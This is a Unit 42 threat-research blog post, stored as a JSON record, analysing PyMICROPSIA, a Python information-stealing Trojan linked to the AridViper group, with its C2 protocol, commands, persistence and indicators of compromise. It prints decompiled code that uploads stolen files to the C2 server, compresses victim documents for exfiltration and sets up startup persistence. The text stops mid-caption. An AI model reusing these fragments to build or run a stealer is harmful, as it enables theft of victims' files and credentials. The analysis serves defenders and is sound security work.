{
    "id": "dffacd4d-d4f5-414a-8cc5-b5633b47dc3a",
    "created_at": "2023-01-12T15:05:40.950919Z",
    "updated_at": "2025-03-27T02:14:43.655898Z",
    "deleted_at": null,
    "sha1_hash": "188c717c64fcfd20a2e2d6d0e51f60abc0b2397e",
    "title": "2020-12-14 - PyMICROPSIA- New Information-Stealing Trojan from AridViper",
    "authors": "",
    "file_creation_date": "2022-05-29T01:00:23Z",
    "file_modification_date": "2022-05-29T01:00:23Z",
    "file_size": 3293002,
    "plain_text": "# PyMICROPSIA: New Information-Stealing Trojan from AridViper\n\n**unit42.paloaltonetworks.com/pymicropsia/**\n\nUnit 42 December 14, 2020\n\nBy [Unit 42](https://unit42.paloaltonetworks.com/author/unit42/)\n\nDecember 14, 2020 at 6:00 AM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [AridViper,](https://unit42.paloaltonetworks.com/tag/aridviper/) [information stealer,](https://unit42.paloaltonetworks.com/tag/information-stealer/) [MICROPSIA,](https://unit42.paloaltonetworks.com/tag/micropsia/) [Trojan](https://unit42.paloaltonetworks.com/tag/trojan/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/pymicropsia/)\n\n## Executive Summary\n\nUnit 42 researchers have been tracking the threat group AridViper, which has been targeting\nthe Middle Eastern region. As part of this research, a new information-stealing Trojan with\nrelations to the [MICROPSIA malware family has been identified, showing that the actor](https://unit42.paloaltonetworks.com/unit42-targeted-attacks-middle-east-using-kasperagent-micropsia/#:~:text=We%20named%20the%20second%20new,malicious%20updates%20a%20secure%20updates.)\nmaintains a very active development profile, creating new implants that seek to bypass the\ndefenses of their targets. We have named this new malware family PyMICROPSIA because\nit is built with Python.\n\n\n-----\n\nFigure 1 below provides a high-level overview of the capabilities of the PyMICROPSIA\nmalware family and similarities observed with previous AridViper activity. While investigating\nPyMICROPSIA capabilities, we identified two additional samples hosted in the attacker’s\ninfrastructure, which are downloaded and used by PyMICROPSIA during its deployment.\nThe additional samples provide persistence and keylogging capabilities, which we discuss\nlater.\n\nFigure 1. PyMICROPSIA overview.\nIn this blog, we will detail the functionality and objectives of PyMICROPSIA and analyze its\ncommand and control (C2) implementation. We will also highlight the main observations that\nallow us to attribute PyMICROPSIA to previous AridViper activity.\n\n[Palo Alto Networks Next-Generation Firewall customers are protected from the attacks](https://www.paloaltonetworks.com/network-security/next-generation-firewall)\n[outlined in this blog with WildFire,](https://www.paloaltonetworks.com/products/secure-the-network/wildfire) [URL Filtering and](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security) [DNS Security subscriptions. Customers](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/dns-security)\n[are also protected with AutoFocus and](https://www.paloaltonetworks.com/cortex/autofocus) [Cortex XDR.](https://www.paloaltonetworks.com/cortex/cortex-xdr)\n\n## PyMICROPSIA Analysis\n\nPyMICROPSIA has a rich set of information-stealing and control capabilities, including:\n\n\n-----\n\nFile uploading.\nPayload downloading and execution.\nBrowser credential stealing. Clearing browsing history and profiles.\nTaking screenshots.\nKeylogging.\nCompressing RAR files for stolen information.\nCollecting process information and killing processes.\nCollecting file listing information.\nDeleting files.\nRebooting machine.\nCollecting Outlook .ost file. Killing and disabling Outlook process.\nDeleting, creating, compressing and exfiltrating files and folders.\nCollecting information from USB drives, including file exfiltration.\nAudio recording.\nExecuting commands.\n\n**Implementation Overview**\n\nPyMICROPSIA is an information-stealing Trojan built with Python and made into a Windows\n[executable using PyInstaller.](https://www.pyinstaller.org/)\n\nFigure 2. PyInstaller strings in PyMICROPSIA.\nIt implements its main functionality by running a loop, where it initializes different threads and\ncalls several tasks periodically with the intent of collecting information and interacting with\nthe C2 operator.\n\n\n-----\n\n-----\n\nFigure 3. Main code loop.\nThe actor makes use of several interesting Python libraries to achieve its purposes, including\nboth built-in Python libraries and specific packages. Some examples of information-stealing\nspecific libraries are:\n\n[PyAudio, for audio stealing capabilities.](https://pypi.org/project/PyAudio/)\n[mss, for screenshot capabilities.](https://pypi.org/project/mss/)\n\nFigure 4. PyAudio library for audio recording.\n\nFigure 5. mss library for screenshots.\nThe usage of Python built-in libraries is expected for multiple purposes, such as interacting\n[with Windows processes,](https://docs.python.org/3/library/subprocess.html) [Windows registry, networking, file system and so on.](https://docs.python.org/3/library/winreg.html)\n\n\n-----\n\nFigure 6. Windows Registry interaction.\n\nFigure 7. Windows processes interaction.\nFor more specific interactions with the Windows operating system, it makes use of libraries\nsuch as:\n\n[WMI, for interaction with Windows Management Instrumentation.](https://pypi.org/project/WMI/)\n[win32security and](http://timgolden.me.uk/pywin32-docs/win32security.html) [ntsecuritycon, for interaction with the win32security API.](https://github.com/saltstack/salt-windows-install/blob/master/deps/salt/python/App/Lib/site-packages/win32/lib/ntsecuritycon.py)\n\n\n-----\n\nFigure 8. WMI usage for USB interaction.\n\nFigure 9. win32security and ntsecuritycon usage.\nAn in-depth analysis of the code and capabilities of PyMICROPSIA can be found in the\nAppendix.\n\n**Command and Control**\n\nPyMICROPSIA implements a simple HTTP POST-based C2 protocol, using different Uniform\nResource Identifier (URI) paths and variables during the communication depending on the\nfunctionality invoked (full details on the implementation can be found in the Appendix).\n\n\n-----\n\nThe following table summarizes the URI paths and corresponding functionality in\nPyMICROPSIA:\n\n**Path** **Method**\n\n/zoailloaze/sfuxmiibif/samantha Delete request. Unregister.\n\n/zoailloaze/sfuxmiibif/lashawna Device registration.\n\n/zoailloaze/sfuxmiibif/matheny Send command output data.\n\n/zoailloaze/sfuxmiibif/uiasfvz USB device information\n\n/zoailloaze/sfuxmiibif/daryl Delete request.\n\n/zoailloaze/sfuxmiibif/qprbudls Download payload.\n\n/zoailloaze/sfuxmiibif/nyrvoz Download URL.\n\n/zoailloaze/sfuxmiibif/hortense1 Upload file.\n\n_Table 1. Main purpose of configuration folders and files._\n\nIt's also important to note that in the PyMICROPSIA samples analyzed, the C2-related code\nshows several code branches that will never be executed when responses are processed,\nlikely because the actor is still actively working on the code. Based on the code sections that\nare reachable, the following table summarizes the commands and actions performed on the\nvictim machine:\n\n**Command** **Action**\n\nLee Register new device.\n\nRenee Delete device.\n\nRapunzel Steal and upload browser credentials to C2.\n\nMulan Collect and upload process list.\n\nSilverman Collect and upload file information in TXT format.\n\nEeyore Delete Firefox profiles and de-register device.\n\nPocahontas Collect and upload compressed file information in JSON detailed format.\n\nInfoCinder Collect and upload information regarding drives in the system.\n\n_Table 2. Reachable C2 commands and actions._\n\n**Is AridViper Working on New Attack Vectors?**\n\n\n-----\n\nPyMICROPSIA is designed to target Windows operating systems only, but the code contains\ninteresting snippets checking for other operating systems, such as “posix” or “darwin”. This is\nan interesting finding, as we have not witnessed AridViper targeting these operating systems\nbefore and this could represent a new area the actor is starting to explore.\n\nPython\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nelse:\nif os.name == 'posix' and sys.platform == 'darwin':\nPathName = os.getenv('HOME') + '/Library/Application\nSupport/Google/Chrome/Default/'\nif os.path.isdir(PathName) == False:\nsys.exit(0)\nelif os.name == 'posix':\nPathName = os.getenv('HOME') + '/.config/google-chrome/Default/'\nif os.path.isdir(PathName) == False:\nsys.exit(0)\nreturn PathName\n\n\nFor now, the code found is very simple, and could be part of a copy and paste effort when\nbuilding the Python code, but in any case, we plan to keep it on our radar while researching\nnew activity.\n\n**Additional Payloads**\n\nDuring the C2 interactions, PyMICROPSIA downloads two additional samples that are\ndropped and executed on the victim’s system, running additional functionality. These\npayloads are not Python / PyInstaller based.\n\n**KeyLogger functionality**\n\nThis is a very interesting case, as the keylogging functionality hasn’t been implemented\nnatively as part of PyMICROPSIA. Instead, the sample downloads a specific payload (see\nthe section on File Download Capabilities in the Appendix for details on how the payload is\ndownloaded).\n\nThe payload is downloaded with filename “MetroIntelGenericUIFram.exe” and has the\nfollowing SHA-256:\n\n381b1efca980dd744cb8d36ad44783a35d01a321593a4f39a0cdae9c7eeac52f\n\n[The sample implements keylogging capabilities using the GetAsyncKeyState API method:](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate)\n\n\n-----\n\nFigure 10. Keylogger GetAsyncKey() code.\nIt has a hardcoded configuration directly related to the directory structure initialized by the\nmain PyMICROPSIA sample, so it needs to be compiled according to it. It needs to run\nunder a specific directory created by PyMICROPSIA (“ModelsControllerLibb”), and will store\n\n\n-----\n\nkeystroke information under the HPFusionManagerDell folder.\n\nFigure 11. Hardcoded configuration parameters.\nThe keylogger drops information into the HPFusionManagerDell directory with the following\nfilename structure and format:\n\nFigure 12. Keylogger output file format.\n\nFigure 13. Keylogger file content structure.\n**Persistence**\n\nPersistence in this malware sample can be achieved via regular methods, such as setting up\nregistry keys, which is done as part of the Python code as follows:\n\n\n-----\n\nFigure 14. Registry key persistence.\nHowever, there is something interesting about persistence in this implementation. The\nsample downloads another payload from the C2 server (see the File Download Capabilities\nsection for more details). This payload is named “SynLocSynMomentum.exe”, with the\nfollowing SHA-256:\n\n9c32fdf5af8b86049abd92561b3d281cb9aebf57d2dfef8cc2da59df82dca753\n\nThe sample is executed with specific parameters:\n\nSynLocSynMomentum.exe ModelsControllerLibb ModelsControllerLib\n\nIt sets up persistence via the shortcut .lnk copied to the startup menu. It's striking that this\ncode is run as a separate payload considering the amount of functionality already present in\nthe Python code.\n\nMS DOS\n\n1 \"C:\\Windows\\System32\\cmd.exe\" /c move\n\"C:\\Users\\admin\\AppData\\Local\\Temp\\\\ModelsControllerLib.lnk\"\n\"C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\ModelsControllerLib.lnk\"\n\n## Relations With Other MICROPSIA Activity\n\nWe unearthed PyMICROPSIA while investigating recent MICROPSIA activity related to the\nMiddle Eastern region, and there are multiple aspects of the malware that link the activity to\nAridViper, including the following examples.\n\n**Code Overlaps**\n\nOne of the first things that caught our attention regarding this sample was the C2\nimplementation and capabilities, which are quite similar to known MICROPSIA samples. For\n[example, see the C2 descriptions in previous research by Radware and](https://blog.radware.com/security/2018/07/micropsia-malware/) [Check Point.](https://research.checkpoint.com/2018/apt-attack-middle-east-big-bang/)\n\nAlso, one of the tactics, techniques and procedures (TTPs) observed across MICROPSIA\nsamples is the use of rar.exe to compress data for exfiltration. In this version, rar.exe is\ndownloaded from the C2 infrastructure and used with very similar parameters as observed in\nprevious samples:\n\n\n-----\n\nPython\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nk24 = '\"' + Wv + '\\\\*.dot' + '\" '\nk25 = '\"' + Wv + '\\\\*.dotx' + '\" '\nAllFile = k1 + k2 + k3 + k4 + k5 + k6 + k7 + k8 + k9 + k11 + k12 + k13 + k14 + k15 +\nk16 + k17 + k18 + k19 + k20 + k21 + k22 + k23 + k24 + k25\nAllFiles_Drvi = AllFile\nflTDType = AllFiles_Drvi\nte = file_D\nEn_crpypt2 = 'a -r -ep1 -v2.5m -ta' + te + ' -hp'\nEn = '4545933464930447517744759'\nmm = chick_Device_Name() + En\nnnWithoutdel = En_crpypt2 + mm\nsubprocess.call('\"' + Rar_File + '\"' + ' ' + (nnWithoutdel + ' ' + '\"' + Zip_File2 +\n'_NETWORKWTHDate\"' + ' ' + flTDType), shell=True)\n\n\nFor example, see how one recent sample of MICROPSIA makes use of rar.exe.\n\nSHA-256: 3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac\n\nMS DOS\n\n1 \"C:\\Program Files\\WinRAR\\Rar.exe\" a -r -ep1 -v2500k hpcec6b597e046386f74b807c60ada61a5_d01247a1eaf1c24ffbc851e883e67f9b ta2020-10-21 \"C:\\ProgramData\\commonlogfiles\\LMth_C\" \"C:\\Users\\admin\\*.xls\"\n\"C:\\Users\\admin\\*.xlsx\" \"C:\\Users\\admin\\*.doc\" \"C:\\Users\\admin\\*.docx\"\n\"C:\\Users\\admin\\*.csv\" \"C:\\Users\\admin\\*.pdf\" \"C:\\Users\\admin\\*.ppt\"\n\"C:\\Users\\admin\\*.pptx\" \"C:\\Users\\admin\\*.odt\" \"C:\\Users\\admin\\*.mdb\"\n\"C:\\Users\\admin\\*.accdb\" \"C:\\Users\\admin\\*.accde\" \"C:\\Users\\admin\\*.txt\"\n\"C:\\Users\\admin\\*.rtf\"\n\n**C2 Communication Similarity**\n\nThe URI path structures observed in multiple MICROPSIA samples follow a similar structure\nto the ones in the PyMICROPSIA samples. For example, if we look into the same recent\nMICROPSIA sample, we can observe the random characters and structure of the URI paths.\n\nSHA-256:\n\n3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac\n\nhxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/rxkwjt\n\nhxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/zxfsyadoss/gM69sY\n\nhxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/tpmpyyzwg\n\nhxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/ImoOEJ\n\nhxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/voT8FY\n\nhxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/rxkwjt\n\nhxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/zxfsyadoss/TocLI5\n\n\n-----\n\nhxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/9WnKfe\nhxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/zxfsyadoss/pyPaqj\nhxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/HRabCX\n\n**Themes Used**\n\nIn the past, we have seen references in MICROPSIA to specific themes when it comes to\n[code and C2 implementation, such as The Big Bang Theory or](https://research.checkpoint.com/2018/apt-attack-middle-east-big-bang/) [Game of Thrones, and this](https://blog.talosintelligence.com/2017/06/palestine-delphi.html)\nnew implementation is not different, including multiple references to multiple famous actor\nnames, both in code variables as well as in infrastructure used, as can be seen in Figures 15\nand 16.\n\nFigure 15. MICROPSIA is known for referencing themes in code, such as The Big Bang\nTheory and Game of Thrones. The reference to the actor Fran Drescher shown above\nseems in line with previous observations of themes.\n\nFigure 16. MICROPSIA is known for referencing themes in code, such as The Big Bang\nTheory and Game of Thrones. The reference to the actor Keanu Reeves shown above\nseems in line with previous observations of themes.\nAlso, as described in the Command and Control section, the C2 operations contain a lot of\nDisney references.\n\nAnother interesting detail is the presence of Arabic comments in the code:\n\nPython\n\n1 Delete_Request_Error('ﻟﻢ ﯾﺘﻢ ﺿﻐﻂ ﻫﺬا اﻟﻤﻠﻒ!!..')\n\n\n-----\n\nThis could be a false flag, but it is another possible link to the regional attribution of this\nmalware sample.\n\n## Conclusion\n\nAridViper is an active threat group that continues developing new tools as part of their\narsenal. PyMICROPSIA shows multiple overlaps with other existing AridViper tools such as\nMICROPSIA. Also, based on different aspects of PyMICROPSIA that we analyzed, several\nsections of the malware are still not used, indicating that it is likely a malware family under\nactive development by this actor.\n\nPalo Alto Networks customers are protected from the attacks outlined in this blog in the\nfollowing ways:\n\nAll known AridViper tools, including MICROPSIA and PyMICROPSIA, have malicious\nverdicts in WildFire.\nAutoFocus customers can track the AridViper actor and its tools.\nCortex XDR blocks both PyMICROPSIA and the dropped payloads.\nC2 domains have been categorized as Command and Control in URL Filtering and\nDNS Security.\n\n## Indicators of Compromise\n\n**PyMICROPSIA Samples**\n\n11487246a864ee0edf2c05c5f1489558632fb05536d6a599558853640df8cd78\n\nddaeffb12a944a5f4d47b28affe97c1bc3a613dab32e5b5b426ef249cfc29273\n\n46dae9b27f100703acf5b9fda2d1b063cca2af0d4abeeccc6cd45d12be919531\n\n**MICROPSIA Samples**\n\n47d53f4ab24632bf4ca34e9a10e11b4b6c48a242cbcfcb1579d67523463e59d2\n\n83e0db0fa3feaf911a18c1e2076cc40ba17a185e61623a9759991deeca551d8b\n\neab20d4c0eeff48e7e1b6b59d79cd169cac277aeb5f91f462f838fcd6835e0ac\n\n078212fc6d69641e96ed04352fba4d028fd5eadc87c7a4169bfbcfc52b8ef8f2\n\n0d65b9671e51baf64e1389649c94f2a9c33547bfe1f5411e12c16ae2f2f463dd\n\n2115d02ead5e497ce5a52ab9b17f0e007a671b3cd95aa55554af17d9a30de37c\n\n26253e9027f798bafc4a70bef1b5062f096a72b0d7af3065b0f4a9b3be937c99\n\n\n-----\n\n3884ac554dcd58c871a4e55900f8847c9e308a79c321ae46ced58daa00d82ab4\n\n3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac\n\n3da95f33b6feb5dcc86d15e2a31e211e031efa2e96792ce9c459b6b769ffd6a4\n\n42fa99e574b8ac5eddf084a37ef891ee4d16742ace9037cda3cdf037678e7512\n\n4eced949a2da569ee9c4e536283dabad49e2f41371b6e8d40b80a79ec1b0e986\n\n5b8b71d1140beaae4736eb58adc64930613ebeab997506fbb09aabff68242e17\n\n82ad34384fd3b37f85e735a849b033326d8ce907155f5ff2d24318b1616b2950\n\na60cadbf6f5ef8a2cbb699b6d7f072245c8b697bbad5c8639bca9bb55f57ae65\n\nb0562b41552a2fa744390a5f79a843940dade57fcf90cd23187d9c757dc32c37\n\nb61fa79c6e8bfcb96f6e2ed4057f5a835a299e9e13e4c6893c3c3309e31cad44\n\nd28ab0b04dc32f1924f1e50a5cf864325c901e11828200629687cca8ce6b2d5a\n\ndb1c2482063299ba5b1d5001a4e69e59f6cc91b64d24135c296ec194b2cab57a\n\ne869c7f981256ddb7aa1c187a081c46fed541722fa5668a7d90ff8d6b81c1db6\n\neda6d901c7d94cbd1c827dfa7c518685b611de85f4708a6701fcbf1a3f101768\n\n**AridViper Infrastructure**\n\nbaldwin-gonzalez[.]live\n\njaime-martinez[.]info\n\njudystevenson[.]info\n\nrobert-keegan[.]life\n\nbenyallen[.]club\n\nchad-jessie[.]info\n\nescanor[.]live\n\nkrasil-anthony[.]icu\n\nnicoledotson[.]icu\n\nsamwinchester[.]club\n\n\n-----\n\ntatsumifoughtogre[.]club\n\n## APPENDIX: PyMYCROPSIA Malware Analysis\n\nThe following PyMICROPSIA analysis is based on the following sample:\n\nSHA-256: 46dae9b27f100703acf5b9fda2d1b063cca2af0d4abeeccc6cd45d12be919531\n\n**Malware Initialization**\n\n**Environment and Configuration**\n\nAs part of the malware initialization, it's important to highlight two main aspects of\nPyMICROPSIA:\n\nCreates multiple folders with different purposes.\nDefines a list of C2 servers.\n\nFigure 17. Directory structure during initialization.\nThe main purpose for each of the files and folders defined in the initial malware configuration\nis summarized in the following table:\n\n**Directory** **Purpose**\n\nRar_com_Folder Storage for RAR compressed information.\n\nDevName Storage for RAR compressed information.\n\n\n-----\n\nDevNameSound Storage for audio recorded files.\n\nDevNameKeyPress Storage for keylogger output information.\n\nMyFolderName Multipurpose folder. Stores configuration, output with information\ncollected, etc.\n\ndownloadNameApp Filename for applications downloaded from the C2.\n\nNameApps Filename for applications downloaded from the C2.\n\nNameAppShurt Filename for shortcut created for persistence.\n\n_Table 3. Main purpose of configuration folders and files._\n\n**Device Identifier**\n\nDevices are identified based on a combination of computer name, username and a randomly\ngenerated code. Once the code is generated, it’s stored under the multipurpose folder\n“MyFolderName”.\n\nFigure 18. Initialization of device name.\nThis identifier function will be used during C2 communications to keep track of the target.\n\nC2 Selection\n\nFrom a network perspective, the malware picks up a C2 server from the configured list based\non a connectivity test via a POST request to a specific path:\n\n\n-----\n\nFigure 19. Network C2 selection.\nIt then stores the resulting selected domain under the “MyFolderName” multipurpose folder.\n\nFigure 20. Selected domain configuration storage.\n\n**Main Activity Loop**\n\nOnce the initial setup is complete, the malware capabilities start by entering into a loop (see\nFigure 3) where:\n\nSeveral independent threads for audio recording and file uploading are started.\nSpecific tasks are run periodically, covering the following main areas: persistence,\nkeylogging, screenshots and interaction with the C2 operator.\n\n**C2 Implementation**\n\n**Protocol Implementation**\n\nThe protocol implemented is simple. Messages are sent via HTTP POST requests, using\ndifferent URI paths and variables depending on the functionality invoked.\n\nFor example, when a file is uploaded, an HTTP POST request is built as follows:\n\nPython\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ndef Upload_File(type, path, FranDrescher, NB):\nif not os.path.exists(path):\nreturn True\nurl = FranDrescher + '/zoailloaze/sfuxmiibif/hortense1'\ndatei_hochladen = open(path, 'rb')\nfiles = {'terrell': datei_hochladen}\nstatus = False\nwhile not status:\ntry:\nur = requests.post(url, files=files, data={'beau': name_device + ';' + str(NB),\n'type': type, 'FComp': str(NumComPers())})\nif ur.text == 'true':\nstatus = True\ndatei_hochladen.close()\nos.remove(path)\n\n\nThis request contains:\n\nURI Path: '/zoailloaze/sfuxmiibif/hortense1'\nMultipart encoded files, under “terrel” variable.\nForm-encoded data, using ‘beau’, ‘type’ and ‘FComp’ variables.\nSome parameters can contain multiple components, such as ‘beau’ in this case, and\nthey are split with the use of ‘;’.\n\nWhen responses are received, if they contain operations to execute, they are sent via strings\nwith components split with ‘;’ as delimiter. For example, the following code snippet shows the\ncommunication with the C2 operator and how it treats the response (only some interesting\nportions are shown for brevity):\n\nPython\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\nur = requests.post(url, data={'beau': name_device + ';' + str(getLastModDir(4))})\nresArr = ur.text\nIm_extin = resArr.split(';')[0]\nif ur.status_code == 200:\nif resArr == 'Lee':\nregister_new_device(FranDrescher)\nelif resArr == 'Melissa':\npass\nelif resArr == 'Renee':\nstatus = Delete_Request(Im_extin)\nelif resArr == 'nero':\npass\nelse:\nIm_extintion = resArr.split(';')[1]\nif Im_extintion == 'Rapunzel':\npath = args_parser(MyFolderName)\nstatus = Upload_File('else', path, FranDrescher, Im_extin)\nif status:\nstatus = Delete_Request(Im_extin)\nif Im_extintion == 'Gal_Gadot':\npath = Sec_Shot(MyFolderName)\nstatus = Upload_File('lucretia', path, FranDrescher, Im_extin)\nif status:\nstatus = Delete_Request(Im_extin)\n\n...\n...\n...\n\nif Im_extintion == 'Ed_ONeill':\nF_Out = resArr.split(';')[2]\nsrc_B = base64ToString(F_Out)\nif src_B == 'delete':\nstatus = Del_Outlook()\nelse:\n...\n...\n...\nif Im_extintion == 'groot':\nsrc_path = resArr.split(';')[2]\ndist_path = resArr.split(';')[3]\nsrc_B = base64ToString(src_path)\nsrc_B_D = base64ToString(dist_path)\nif os.path.exists(src_B) and os.path.exists(src_B_D\n\n\nThe response is split via ‘;’ delimiter, and depending on the position, contains parameters\nthat can be received in plain text or encoded in base64, depending on each situation.\n\nThe following table summarizes the paths and parameters used during the C2 interactions\nand their functionality:\n\n\n-----\n\n**Path** **Method** **Variables**\n\n/zoailloaze/sfuxmiibif/samantha Delete request. Unregister. beau\n\n/zoailloaze/sfuxmiibif/lashawna Device registration. beau\n\n/zoailloaze/sfuxmiibif/matheny Send command output data. beau, terrel\n\n/zoailloaze/sfuxmiibif/uiasfvz USB device information beau, type\n\n/zoailloaze/sfuxmiibif/daryl Delete request. arturo, beau\n\n/zoailloaze/sfuxmiibif/qprbudls Download payload. beau\n\n/zoailloaze/sfuxmiibif/nyrvoz Download URL. beau\n\n/zoailloaze/sfuxmiibif/hortense1 Upload file. beau, type, FComp, terrel\n\n_Table 4. Paths and parameters used during C2 interactions and their functionality.._\n\n**Interacting with C2 Operator**\n\nBased on the main activity loop, there will be a periodic call to the C2 server, and it will begin\nby sending information regarding the device (device identifier), as well as the last modified\ntime in disk.\n\nPython\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\ndef Chick_Request():\nglobal FranDrescher\nglobal WD\nglobal Wv\nurl = FranDrescher + '/zoailloaze/sfuxmiibif/lashawna'\nur = requests.post(url, data={'beau': name_device + ';' + str(getLastModDir(4))})\nresArr = ur.text\nIm_extin = resArr.split(';')[0]\n\n\nIt's interesting to see how this captures the latest disk activity date. The code shows that it is\nincomplete, as in this case, the type is ‘4’, and it will always return the string ‘empty’ instead\nof any kind of date:\n\nPython\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\ndef getLastModDir(type):\ntry:\nc = wmi.WMI()\nMv = ''\nfor drive in c.Win32_LogicalDisk(DriveType=type):\nMv = drive.Caption\n\nlast_date = ''\ndirpath = Mv\nentries = (os.path.join(dirpath, fn) for fn in os.listdir(dirpath))\nentries = ((os.stat(path), path) for path in entries)\nentries = ((stat[ST_MTIME], path) for stat, path in entries if\nS_ISREG(stat[ST_MODE]))\nfor cdate, path in entries:\nlast_date = datetime.datetime.fromtimestamp(cdate)\n\nif type == 4:\nreturn 'empty'\nreturn last_date\nexcept Exception as e:\nreturn 'empty'\n\n\nThere are several examples of implementations like this across the code, which show an\nincomplete or ongoing implementation, which is a signal that the sample is still under active\ndevelopment by the actor.\n\nAs we mentioned before, the response string is split by its delimiter and the commands and\nencoded parameters sent by the C2 operator are parsed. As an interesting fact, the\ncommands are full of references to Disney (in the past, we have seen AridViper using\nvariables referencing characters of The Big Bang Theory or Game of Thrones, for example).\n\n\n-----\n\nFigure 21. C2 commands example.\n\n\n-----\n\nAnother interesting example of incomplete code is the fact that the code won t be able to go\nthrough all the possible branches and functionality in the C2 implementation. For example, in\nthe following code snippet, if the code enters into the “Mulan” branch, it won’t enter into the\n“Vanellope” code block:\n\nPython\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nif Im_extintion == 'Mulan':\npath = Process_list(MyFolderName)\nstatus = Upload_File('else', path, FranDrescher, Im_extin)\nif status:\nstatus = Delete_Request(Im_extin)\nif Im_extintion == 'Mulan_Fire':\nK_process('firefox.exe')\nCompress_File_Rar_WithoutDel2()\nstatus = Delete_Request(Im_extin)\nif Im_extintion == 'Vanellope':\npath = Get_ImgType(MyFolderName)\nstatus = Upload_File('else', path, FranDrescher, Im_extin)\nif status:\nstatus = Delete_Request(Im_extin)\nif Im_extintion == 'Calhoun':\npath = Get_VedioType(MyFolderName)\nstatus = Upload_File('else', path, FranDrescher, Im_extin)\nif status:\nstatus = Delete_Request(Im_extin)\n\n\nThis is another signal of incomplete implementation and possible active development.\n\nA summary of the commands that are reachable by code execution has been provided in\nTable 2.\n\n**Information-Stealing and Control Capabilities**\n\nThis malware sample has a rich set of information-stealing and control capabilities, whether\nthey’re reachable in the current C2 implementation or not. The following sections will detail\nsome of the most relevant capabilities only, in order to provide visibility into how this malware\nfamily is implemented.\n\n**Audio Recording**\n\n[Audio recording is achieved with the usage of the pyaudio and](https://pypi.org/project/PyAudio/) [wave Python libraries. Data is](https://docs.python.org/3/library/wave.html)\nstored under the “DevNameSound” folder.\n\n\n-----\n\nFigure 22. Audio recording implementation.\nThe recordings are stored in the corresponding folder, and the running threads as well as the\noperator commands will allow for the retrieval of the information captured.\n\n**File Download Capabilities**\n\nThe ability to download files from the C2 is implemented via a POST request to the following\nURL path:\n\n/zoailloaze/sfuxmiibif/qprbudls\n\nAs part of the POST request, a parameter named “beau” will be used to specify the type of\nfile download. Based on its value, it can download specific payloads as well as given URLs.\nThe code looks as follows:\n\n\n-----\n\nFigure 23. Download code example.\n\n**Value of “beau”** **Action**\n\n‘1’ Download a legit version or rar.exe.\n\n‘2’ Download MetroIntelGenericUIFram.exe.\n\n‘3’ Download SynLocSynMomentum.exe.\n\nA given URL Download from any specified URL.\n\n_Table 5. Values of “beau” for sample download._\n\n**File Uploading**\n\nThe malware sample starts threads that will periodically upload compressed samples located\nin different folders.\n\n\n-----\n\nFigure 24. Upload threads initialized by the sample.\nFile uploads are performed via POST request to the following path:\n\n/zoailloaze/sfuxmiibif/hortense1\n\nData is specified via a POST parameter, “beau”, that can contain several variables, always\ndelimited with “;”. Files are specified with a POST parameter named “terrel”.\n\nBoth the mentioned threads, as well as the operators via C2 interaction, can invoke upload\ncode. Here is one example of such a method, where the implementation can be observed:\n\n\n-----\n\nFigure 25. Upload method example.\n**Screenshot Capabilities**\n\nScreenshots are sent to the C2 using Python’s [mss library both periodically as well as on](https://pypi.org/project/mss/)\ndemand if the C2 operator sends the appropriate command.\n\nFigure 26. Screenshot capabilities.\n**File Gathering Information**\n\n\n-----\n\nThroughout the code, multiple methods oriented toward collecting information can be found.\nThe methods are invoked based on different interactions with the C2 operator, and they give\nthe operators flexibility on what kind of information they want to collect.\n\nFor example, there are generic methods to collect specific folders and with different levels of\ninformation detailed, as can be seen in several of the figures below.\n\nFigure 27. Collection of samples under C:\\users and C:\\Documents and Settings.\n\n\n-----\n\nFigure 28. Detailed collection of samples under several folders of interest in JSON format.\nThere are methods to collect information from external drives:\n\n\n-----\n\nFigure 29. Example of USB information collection.\nAs well as other approaches, such as methods to focus on specific file extensions.\n\n\n-----\n\nFigure 30. Example of collection of file information by specific extension type.\n**File Retrieval**\n\nFile operators have plenty of commands that allow different types of files to be collected from\ndisk. This method of collection is normally accomplished by selecting the target files and\nusing the legitimate RAR utility to compress data that will be uploaded to the C2. The\nfollowing example shows how the commands focus on specific extensions:\n\n\n-----\n\nFigure 31. Example of file selection, compression and gathering by extension type.\n**Command Execution**\n\nThe AridViper operators have the ability to send parameters together with the commands\nacross the C2 interaction. These commands are split by a specific delimiter ‘;’ in this sample,\ntravelling encoded in base64. The sample has different options implemented, allowing the\noperators very flexible execution of commands such as download and execution of payloads\nfrom a given URL, process execution, etc.\n\n\n-----\n\nFigure 32. URL download and process execution 